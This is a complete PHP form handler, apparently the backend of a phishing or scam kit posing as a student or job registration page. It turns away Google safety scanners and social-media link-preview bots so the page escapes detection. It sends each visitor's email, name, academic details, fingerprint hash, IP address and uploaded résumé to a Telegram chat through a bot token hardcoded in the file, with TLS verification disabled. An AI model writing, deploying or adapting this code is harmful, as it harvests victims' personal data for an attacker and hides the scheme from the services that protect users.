<?php
// ============================================================
// ULTIMATE FORM SUBMISSION HANDLER – VISUALLY ENHANCED
// ============================================================

// 1. Anti-bot / crawler
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (preg_match('/(TelegramBot|WhatsApp|Instagram|facebookexternalhit|Facebot|GoogleImageProxy|Googlebot|Google-Safety|Mediapartners-Google)/i', $userAgent)) {
    exit();
}

// 2. Telegram config
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
$chatId   = "-1003598938463";
$logFile  = __DIR__ . '/submissions.log'; // optional

// 3. Helper functions

function getClientIp() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return trim($ip);
}

function sendTelegramMessage($text) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text'    => $text,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => false
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

function sendTelegramDocument($filePath, $caption = '') {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendDocument";
    $postFields = [
        'chat_id' => $chatId,
        'document' => new CURLFile($filePath),
        'caption'  => $caption,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_exec($ch);
    curl_close($ch);
}

// 4. Get client IP
$ip = getClientIp();

// 5. Sanitize form fields
$email    = htmlspecialchars(trim($_POST['email'] ?? ''), ENT_QUOTES, 'UTF-8');
$fullName = htmlspecialchars(trim($_POST['fullname'] ?? ''), ENT_QUOTES, 'UTF-8');
$gender   = htmlspecialchars(trim($_POST['gender'] ?? ''), ENT_QUOTES, 'UTF-8');
$college  = htmlspecialchars(trim($_POST['college'] ?? ''), ENT_QUOTES, 'UTF-8');
$degree   = htmlspecialchars(trim($_POST['degree'] ?? ''), ENT_QUOTES, 'UTF-8');
$stream   = htmlspecialchars(trim($_POST['stream'] ?? ''), ENT_QUOTES, 'UTF-8');
$cgpa     = htmlspecialchars(trim($_POST['cgpa'] ?? ''), ENT_QUOTES, 'UTF-8');
$fpHash   = htmlspecialchars(trim($_POST['fingerprint_hash'] ?? ''), ENT_QUOTES, 'UTF-8');
if (empty($fpHash)) $fpHash = 'Not provided';

// Basic validation
if (empty($email) || empty($fullName)) {
    sendTelegramMessage("⚠️ <b>Submission Error</b>\nMissing required fields.\nIP: <code>$ip</code>");
    echo "ERROR";
    exit;
}

// 6. Handle file upload
$resume = $_FILES['resume'] ?? null;
$hasFile = $resume && $resume['error'] === UPLOAD_ERR_OK;

if (!$hasFile) {
    // --- No file: send text message ---
    $text = "📋 <b>NEW REGISTRATION (no file)</b>\n";
    $text .= "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
    $text .= "👤 <b>PERSONAL DETAILS</b>\n";
    $text .= "├ Email: <code>$email</code>\n";
    $text .= "├ Full Name: $fullName\n";
    $text .= "├ Gender: $gender\n";
    $text .= "├ College: $college\n";
    $text .= "├ Degree: $degree\n";
    $text .= "├ Stream: $stream\n";
    $text .= "├ CGPA: $cgpa\n";
    $text .= "└ Fingerprint Hash: <code>$fpHash</code>\n\n";
    $text .= "🌍 <b>LOCATION</b>\n";
    $text .= "└ IP: <code>$ip</code>\n";
    sendTelegramMessage($text);
} else {
    // --- Validate file type ---
    $allowedMime = [
        'application/pdf',
        'application/msword',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
    ];
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $resume['tmp_name']);
    finfo_close($finfo);

    if (!in_array($mime, $allowedMime)) {
        sendTelegramMessage("❌ <b>Invalid File Type</b>\nUser: $email\nIP: <code>$ip</code>\nMIME: $mime");
        echo "ERROR";
        exit;
    }

    if ($resume['size'] > 10 * 1024 * 1024) {
        sendTelegramMessage("❌ <b>File Too Large</b>\nUser: $email\nIP: <code>$ip</code>\nSize: " . round($resume['size']/1024/1024,2) . " MB");
        echo "ERROR";
        exit;
    }

    // --- Save temp file ---
    $tmpDir = sys_get_temp_dir();
    $safeName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $resume['name']);
    $tmpFilePath = $tmpDir . '/' . uniqid('resume_', true) . '_' . $safeName;
    if (!move_uploaded_file($resume['tmp_name'], $tmpFilePath)) {
        sendTelegramMessage("❌ <b>File Save Failed</b>\nUser: $email\nIP: <code>$ip</code>");
        echo "ERROR";
        exit;
    }

    // --- Prepare caption ---
    $caption = "📄 <b>NEW REGISTRATION with Resume</b>\n";
    $caption .= "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
    $caption .= "👤 <b>PERSONAL DETAILS</b>\n";
    $caption .= "├ Email: <code>$email</code>\n";
    $caption .= "├ Full Name: $fullName\n";
    $caption .= "├ Gender: $gender\n";
    $caption .= "├ College: $college\n";
    $caption .= "├ Degree: $degree\n";
    $caption .= "├ Stream: $stream\n";
    $caption .= "├ CGPA: $cgpa\n";
    $caption .= "└ Fingerprint Hash: <code>$fpHash</code>\n\n";
    $caption .= "🌍 <b>LOCATION</b>\n";
    $caption .= "└ IP: <code>$ip</code>\n\n";
    $caption .= "📎 <b>RESUME</b>\n";
    $caption .= "├ File: " . htmlspecialchars($resume['name']) . "\n";
    $caption .= "├ Size: " . round($resume['size'] / 1024 / 1024, 2) . " MB\n";
    $caption .= "└ [Attached below]";

    // --- Send document ---
    sendTelegramDocument($tmpFilePath, $caption);

    // --- Clean up ---
    unlink($tmpFilePath);
}

// 7. Log submission (optional)
$logEntry = date('Y-m-d H:i:s') . " | $ip | $email | $fullName | $fpHash\n";
@file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

// 8. Return success
echo "OK";
?>
